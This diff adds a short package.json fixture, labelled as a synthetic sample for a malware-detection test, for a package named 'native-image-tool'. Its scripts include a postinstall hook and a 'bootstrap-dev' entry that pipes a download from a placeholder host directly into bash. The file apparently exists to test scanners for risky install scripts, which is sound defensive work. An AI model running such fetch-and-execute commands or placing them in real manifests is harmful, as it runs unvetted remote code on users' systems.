@@ -1,0 +1,10 @@
+{
+  "_comment": "FIXTURE ONLY — synthetic detection test sample, not real malware",
+  "name": "native-image-tool",
+  "version": "3.1.0",
+  "scripts": {
+    "postinstall": "node scripts/fetch-binary.js",
+    "prepare": "tsc -p tsconfig.json",
+    "bootstrap-dev": "curl -fsSL https://dl.example.invalid/dev-setup.sh | bash"
+  }
+}
